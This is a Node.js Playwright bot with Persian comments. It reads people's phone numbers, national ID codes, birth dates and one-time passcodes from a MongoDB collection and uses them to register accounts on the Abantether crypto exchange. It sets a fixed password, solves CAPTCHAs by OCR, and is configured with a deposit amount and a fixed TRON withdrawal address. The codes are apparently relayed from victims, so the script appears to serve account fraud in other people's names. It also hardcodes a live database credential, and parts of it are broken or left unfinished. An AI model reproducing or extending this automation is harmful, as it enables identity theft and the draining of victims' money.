const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');
const Tesseract = require('tesseract.js');
const fs = require('fs').promises;
const path = require('path');

class AbanTetherBot {
    constructor() {
        // تنظیمات
        this.mongoUri = 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority';
        this.dbName = 'ZarrinApp';
        this.collectionName = 'zarinapp';
        this.password = 'ImSorryButIhaveTo@1';
        this.depositAmount = '5000000';
        this.withdrawAmount = '40';
        this.withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
        this.maxRetries = 3;
        this.screenshotsDir = './debug_screenshots';
        
        // متغیرها
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set();
        this.mongoClient = null;
        this.db = null;
        this.collection = null;
    }

    // --- سیستم عکس‌برداری ---
    async takeScreenshot(name) {
        try {
            await fs.mkdir(this.screenshotsDir, { recursive: true });
            const screenshotPath = path.join(this.screenshotsDir, `${name}-${Date.now()}.png`);
            await this.page.screenshot({ path: screenshotPath, fullPage: true });
            this.log('SCREENSHOT', `📸 عکس ذخیره شد: ${screenshotPath}`);
            return screenshotPath;
        } catch (error) {
            this.log('ERROR', `❌ خطا در عکس‌برداری: ${error.message}`);
        }
    }

    // --- توابع کمکی ---
    async log(step, message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] [${step}] ${message}`);
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async connectToMongoDB() {
        try {
            this.mongoClient = new MongoClient(this.mongoUri);
            await this.mongoClient.connect();
            this.db = this.client.db(this.dbName);
            this.collection = this.db.collection(this.collectionName);
            this.log('DATABASE', '✅ متصل به دیتابیس شد');
        } catch (error) {
            this.log('ERROR', `❌ خطا در اتصال به دیتابیس: ${error.message}`);
            throw error;
        }
    }

    async updateUserStatus(phone, status, message, retryCount = 0) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        status: status,
                        statusMessage: message,
                        lastUpdated: new Date(),
                        retryCount: retryCount
                    }
                }
            );
            this.log('STATUS', `📊 ${phone}: ${status} - ${message}`);
        } catch (error) {
            this.log('ERROR', `❌ خطا در آپدیت وضعیت: ${error.message}`);
        }
    }

    async waitForFieldInDB(phone, fieldName, timeout = 180000) {
        this.log('WAIT', `⏳ منتظر فیلد ${fieldName} برای ${phone}...`);
        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            try {
                const user = await this.collection.findOne({ personalPhoneNumber: phone });
                
                if (user && user[fieldName] && user[fieldName].trim() !== '') {
                    const value = user[fieldName];
                    this.log('WAIT', `✅ ${fieldName} دریافت شد: ${value}`);
                    
                    await this.collection.updateOne(
                        { personalPhoneNumber: phone },
                        { $unset: { [fieldName]: "" } }
                    );
                    
                    return value;
                }
                
                await this.sleep(5000);
                
            } catch (error) {
                this.log('ERROR', `❌ خطا در بررسی ${fieldName}: ${error.message}`);
                await this.sleep(5000);
            }
        }
        
        throw new Error(`⏰ تایم‌اوت: فیلد ${fieldName} دریافت نشد`);
    }

    async markAsCompleted(phone) {
        try {
            await this.collection.updateOne(
                { personalPhoneNumber: phone },
                { 
                    $set: { 
                        processed: true,
                        status: "completed",
                        completedAt: new Date(),
                        statusMessage: "فرآیند با موفقیت تکمیل شد"
                    }
                }
            );
        } catch (error) {
            this.log('ERROR', `❌ خطا در علامت‌گذاری کاربر: ${error.message}`);
        }
    }

    // --- توابع بهبود یافته برای پیدا کردن المان‌ها ---
    async findAndFill(text, value) {
        try {
            this.log('FILL', `🔍 در حال پیدا کردن فیلد با متن: "${text}"`);
            
            // 1. سعی کن با placeholder پیدا کنی (دقیق)
            const placeholderSelector = `input[placeholder*="${text}"]`;
            let element = await this.page.$(placeholderSelector);
            
            if (element) {
                await element.fill(value);
                this.log('FILL', `✅ پر شد (placeholder): "${text}" = ${value}`);
                await this.sleep(1000);
                return;
            }
            
            // 2. سعی کن با aria-label پیدا کنی
            const ariaSelector = `input[aria-label*="${text}"]`;
            element = await this.page.$(ariaSelector);
            
            if (element) {
                await element.fill(value);
                this.log('FILL', `✅ پر شد (aria-label): "${text}" = ${value}`);
                await this.sleep(1000);
                return;
            }
            
            // 3. سعی کن label پیدا کنی
            const labelXPath = `//label[contains(text(), '${text}')]/following::input[1]`;
            element = await this.page.$(labelXPath);
            
            if (element) {
                await element.fill(value);
                this.log('FILL', `✅ پر شد (label): "${text}" = ${value}`);
                await this.sleep(1000);
                return;
            }
            
            // 4. همه inputها را چک کن
            const allInputs = await this.page.$$('input, textarea');
            for (const input of allInputs) {
                try {
                    const placeholder = await input.getAttribute('placeholder') || '';
                    const ariaLabel = await input.getAttribute('aria-label') || '';
                    const name = await input.getAttribute('name') || '';
                    const id = await input.getAttribute('id') || '';
                    
                    if (placeholder.includes(text) || 
                        ariaLabel.includes(text) || 
                        name.includes(text) || 
                        id.includes(text)) {
                        await input.fill(value);
                        this.log('FILL', `✅ پر شد (تمام چک‌ها): "${text}" = ${value}`);
                        await this.sleep(1000);
                        return;
                    }
                } catch {
                    continue;
                }
            }
            
            throw new Error(`فیلد "${text}" پیدا نشد`);
            
        } catch (error) {
            await this.takeScreenshot(`error-fill-${text}`);
            this.log('ERROR', `❌ خطا در پر کردن فیلد: ${error.message}`);
            throw error;
        }
    }

    async findAndClick(text) {
        try {
            this.log('CLICK', `🔍 در حال پیدا کردن المان با متن: "${text}"`);
            
            // لیست متون مختلف برای جستجو (با توجه به فاصله‌ها)
            const possibleTexts = [
                text, // متن اصلی
                text.replace(/\s+/g, ''), // حذف همه فاصله‌ها
                text.replace(/\s+/g, '‌'), // جایگزینی با نیم‌فاصله
                text.replace(/\s+/g, ' '), // فقط یک فاصله
                text.trim(), // حذف فاصله اول و آخر
            ];
            
            // لیست سلکتورها
            const selectors = [
                'button',
                'a',
                'div',
                'span',
                'input[type="submit"]',
                'input[type="button"]',
                'label'
            ];
            
            for (const searchText of possibleTexts) {
                if (!searchText) continue;
                
                for (const tag of selectors) {
                    try {
                        // سعی کن با has-text پیدا کنی
                        const selector = `${tag}:has-text("${searchText}")`;
                        const element = await this.page.$(selector);
                        
                        if (element && await element.isVisible()) {
                            await element.scrollIntoViewIfNeeded();
                            await element.click();
                            this.log('CLICK', `✅ کلیک شد ("${searchText}" در ${tag}): ${text}`);
                            await this.sleep(2000);
                            return;
                        }
                    } catch {
                        continue;
                    }
                }
            }
            
            // اگر با has-text پیدا نشد، با XPath سعی کن
            for (const searchText of possibleTexts) {
                if (!searchText) continue;
                
                const xpath = `//*[contains(text(), '${searchText}')]`;
                const elements = await this.page.$$(xpath);
                
                for (const element of elements) {
                    try {
                        const tagName = await element.evaluate(node => node.tagName.toLowerCase());
                        if (['button', 'a', 'div', 'span', 'input'].includes(tagName)) {
                            if (await element.isVisible()) {
                                await element.scrollIntoViewIfNeeded();
                                await element.click();
                                this.log('CLICK', `✅ کلیک شد (XPath "${searchText}"): ${text}`);
                                await this.sleep(2000);
                                return;
                            }
                        }
                    } catch {
                        continue;
                    }
                }
            }
            
            // آخرین تلاش: عکس بگیر و خطا بده
            await this.takeScreenshot(`error-click-${text}`);
            throw new Error(`المان "${text}" پیدا نشد`);
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در کلیک کردن: ${error.message}`);
            throw error;
        }
    }

    async selectDropdown(labelText, value) {
        try {
            this.log('SELECT', `🔍 انتخاب "${value}" برای "${labelText}"`);
            
            // 1. با label پیدا کن
            const labelXPath = `//label[contains(text(), '${labelText}')]/following::select[1]`;
            let selectElement = await this.page.$(labelXPath);
            
            if (selectElement) {
                await selectElement.selectOption(value);
                this.log('SELECT', `✅ انتخاب شد (label): "${labelText}" = ${value}`);
                await this.sleep(1000);
                return;
            }
            
            // 2. با name یا id پیدا کن
            const possibleNames = [
                labelText.toLowerCase().replace(/\s+/g, ''),
                labelText.toLowerCase().replace(/\s+/g, '_'),
                labelText.toLowerCase().replace(/\s+/g, '-')
            ];
            
            for (const name of possibleNames) {
                selectElement = await this.page.$(`select[name="${name}"], select[id="${name}"]`);
                if (selectElement) {
                    await selectElement.selectOption(value);
                    this.log('SELECT', `✅ انتخاب شد (name/id): "${labelText}" = ${value}`);
                    await this.sleep(1000);
                    return;
                }
            }
            
            throw new Error(`Dropdown با لیبل "${labelText}" پیدا نشد`);
            
        } catch (error) {
            await this.takeScreenshot(`error-select-${labelText}`);
            this.log('ERROR', `❌ خطا در انتخاب: ${error.message}`);
            throw error;
        }
    }

    // --- هوش مصنوعی برای کپچا ---
    async solveCaptchaWithAI(imageElement) {
        try {
            this.log('AI_CAPTCHA', '🔍 در حال پردازش کپچا با AI...');
            
            const screenshotBuffer = await imageElement.screenshot();
            const { data: { text } } = await Tesseract.recognize(screenshotBuffer, 'fas');
            const cleanedText = text.replace(/\s+/g, '').trim();
            
            this.log('AI_CAPTCHA', `✅ کپچا تشخیص داده شد: "${cleanedText}"`);
            return cleanedText;
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در پردازش کپچا: ${error.message}`);
            throw error;
        }
    }

    // --- مراحل اصلی ---
    async initializeBrowser() {
        try {
            this.log('BROWSER', '🚀 در حال راه‌اندازی مرورگر...');
            
            this.browser = await chromium.launch({ 
                headless: false, // تغییر به false برای دیباگ
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--window-size=1920,1080'
                ]
            });
            
            const context = await this.browser.newContext({
                viewport: { width: 1920, height: 1080 },
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            });
            
            this.page = await context.newPage();
            await this.page.setDefaultTimeout(120000);
            
            this.log('BROWSER', '✅ مرورگر آماده است');
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در راه‌اندازی مرورگر: ${error.message}`);
            throw error;
        }
    }

    async step1_Register(user) {
        try {
            this.log('STEP_1', '📝 مرحله 1: ثبت‌نام');
            await this.updateUserStatus(user.personalPhoneNumber, 'registering', 'در حال ثبت‌نام');
            
            await this.page.goto('https://abantether.com/register', { 
                waitUntil: 'load',
                timeout: 120000 
            });
            
            await this.sleep(5000);
            await this.takeScreenshot('step1-page-loaded');
            
            // وارد کردن شماره موبایل
            await this.findAndFill('شماره موبایل خود را وارد کنید', user.personalPhoneNumber);
            await this.takeScreenshot('step1-phone-filled');
            
            // کلیک روی دکمه ثبت‌نام (دقیقاً با نیم‌فاصله)
            await this.findAndClick('ثبت‌نام');
            await this.takeScreenshot('step1-after-click');
            
            await this.sleep(5000);
            
            // وارد کردن کد OTP
            const otpLogin = await this.waitForFieldInDB(user.personalPhoneNumber, 'otp_login');
            await this.findAndFill('کد ارسال شده به شماره موبایل خود را وارد کنید', otpLogin);
            await this.takeScreenshot('step1-otp-filled');
            
            // کلیک روی مرحله بعد
            await this.findAndClick('مرحله بعد');
            await this.takeScreenshot('step1-after-next');
            
            this.log('STEP_1', '✅ مرحله 1 تکمیل شد');
            await this.sleep(3000);
            
        } catch (error) {
            await this.takeScreenshot('step1-error');
            this.log('ERROR', `❌ خطا در مرحله 1: ${error.message}`);
            throw error;
        }
    }

    async step2_Password(user) {
        try {
            this.log('STEP_2', '🔐 مرحله 2: رمز عبور');
            await this.updateUserStatus(user.personalPhoneNumber, 'setting_password', 'تنظیم رمز عبور');
            await this.takeScreenshot('step2-start');
            
            // وارد کردن رمز عبور
            await this.findAndFill('رمز عبور خود را وارد نمایید', this.password);
            await this.takeScreenshot('step2-password-filled');
            
            // کلیک روی تایید
            await this.findAndClick('تایید');
            await this.takeScreenshot('step2-after-confirm');
            
            this.log('STEP_2', '✅ مرحله 2 تکمیل شد');
            await this.sleep(3000);
            
        } catch (error) {
            await this.takeScreenshot('step2-error');
            this.log('ERROR', `❌ خطا در مرحله 2: ${error.message}`);
            throw error;
        }
    }

    async step3_Identity(user) {
        try {
            this.log('STEP_3', '🆔 مرحله 3: اطلاعات هویتی');
            await this.updateUserStatus(user.personalPhoneNumber, 'verifying_identity', 'تأیید اطلاعات هویتی');
            await this.takeScreenshot('step3-start');
            
            // وارد کردن کد ملی
            await this.findAndFill('کد 10 رقمی شناسایی خود را وارد کنید', user.personalNationalCode);
            await this.takeScreenshot('step3-nationalcode-filled');
            
            // وارد کردن تاریخ تولد
            await this.findAndFill('روز/ماه/سال', user.personalBirthDate);
            await this.takeScreenshot('step3-birthdate-filled');
            
            // کلیک روی ثبت
            await this.findAndClick('ثبت');
            await this.takeScreenshot('step3-after-submit');
            
            this.log('STEP_3', '✅ مرحله 3 تکمیل شد');
            await this.sleep(5000);
            
            // بررسی باکس تبریک
            const continueButton = await this.page.$('button:has-text("ادامه"), button:has-text("تایید")');
            if (continueButton) {
                await continueButton.click();
                this.log('POPUP', '✅ باکس تبریک بسته شد');
                await this.takeScreenshot('step3-popup-closed');
                await this.sleep(2000);
            }
            
        } catch (error) {
            await this.takeScreenshot('step3-error');
            this.log('ERROR', `❌ خطا در مرحله 3: ${error.message}`);
            throw error;
        }
    }

    // بقیه توابع step4 تا step9 مانند قبل (با اضافه کردن takeScreenshot)

    async processUser(user) {
        const phone = user.personalPhoneNumber;
        const retryCount = user.retryCount || 0;
        
        this.currentUser = user;
        this.processingUsers.add(phone);
        
        try {
            this.log('PROCESS', `👤 شروع پردازش کاربر: ${phone} (تلاش ${retryCount + 1}/${this.maxRetries})`);
            await this.updateUserStatus(phone, 'starting', 'شروع فرآیند', retryCount);
            
            // راه‌اندازی مرورگر
            await this.initializeBrowser();
            
            // اجرای مراحل
            await this.step1_Register(user);
            await this.step2_Password(user);
            await this.step3_Identity(user);
            // TODO: step4 تا step9 را اینجا اضافه کن
            
            await this.updateUserStatus(phone, 'completed', 'فرآیند با موفقیت تکمیل شد', retryCount);
            await this.markAsCompleted(phone);
            
            this.log('SUCCESS', `🎉 کاربر ${phone} با موفقیت پردازش شد`);
            
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
            
        } catch (error) {
            this.log('ERROR', `💥 خطا در پردازش کاربر ${phone}: ${error.message}`);
            
            const newRetryCount = retryCount + 1;
            
            if (newRetryCount >= this.maxRetries) {
                await this.updateUserStatus(phone, 'failed', `شکست پس از ${this.maxRetries} تلاش`, newRetryCount);
                this.log('RETRY', `⛔ حداکثر تلاش‌ها برای ${phone} تمام شد`);
            } else {
                await this.updateUserStatus(phone, 'failed', `تلاش ${newRetryCount}/${this.maxRetries}`, newRetryCount);
                this.log('RETRY', `🔄 کاربر ${phone} برای تلاش مجدد علامت‌گذاری شد`);
            }
            
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
            
            throw error;
            
        } finally {
            this.processingUsers.delete(phone);
            this.currentUser = null;
        }
    }

    // --- بقیه توابع (همانند قبل) ---
    async startPolling() {
        await this.connectToMongoDB();
        this.log('POLLING', '🔄 شروع نظارت بر دیتابیس (هر 30 ثانیه)');
        
        await this.checkDatabase();
        
        setInterval(async () => {
            try {
                await this.checkDatabase();
            } catch (error) {
                this.log('ERROR', `❌ خطا در نظارت: ${error.message}`);
            }
        }, 30000);
    }

    async checkDatabase() {
        try {
            const query = {
                $or: [
                    { otp_login: { $exists: true, $ne: null, $ne: '' } },
                    { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
                    { otp_payment: { $exists: true, $ne: null, $ne: '' } }
                ],
                processed: { $ne: true },
                status: { $ne: 'failed' },
                $or: [
                    { retryCount: { $exists: false } },
                    { retryCount: { $lt: this.maxRetries } }
                ]
            };

            const pendingUsers = await this.collection.find(query).limit(10).toArray();
            this.log('DATABASE', `📊 ${pendingUsers.length} کاربر نیازمند پردازش یافت شد`);
            
            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                if (!this.processingUsers.has(phone)) {
                    this.log('PROCESSING', `🚀 شروع پردازش برای: ${phone}`);
                    
                    this.processUser(user).catch(error => {
                        this.log('ERROR', `خطا در پردازش ${phone}: ${error.message}`);
                    });
                } else {
                    this.log('SKIP', `⏭️ ${phone} در حال پردازش است`);
                }
            }
            
        } catch (error) {
            this.log('ERROR', `❌ خطا در بررسی دیتابیس: ${error.message}`);
        }
    }

    async start() {
        this.log('START', '🤖 ربات آبان تتر راه‌اندازی شد');
        this.log('CONFIG', `حداکثر تلاش‌ها: ${this.maxRetries}`);
        
        try {
            await this.startPolling();
            
            process.on('SIGINT', async () => {
                this.log('SHUTDOWN', '🛑 دریافت سیگنال خاتمه...');
                if (this.mongoClient) await this.mongoClient.close();
                process.exit(0);
            });
            
            process.on('SIGTERM', async () => {
                this.log('SHUTDOWN', '🛑 دریافت سیگنال ترمینیت...');
                if (this.mongoClient) await this.mongoClient.close();
                process.exit(0);
            });
            
        } catch (error) {
            this.log('ERROR', `💥 خطا در راه‌اندازی: ${error.message}`);
            setTimeout(() => this.start(), 10000);
        }
    }
}

// --- اجرای ربات ---
const bot = new AbanTetherBot();

process.on('unhandledRejection', (error) => {
    console.error('[UNHANDLED_REJECTION]', error);
});

process.on('uncaughtException', (error) => {
    console.error('[UNCAUGHT_EXCEPTION]', error);
});

bot.start();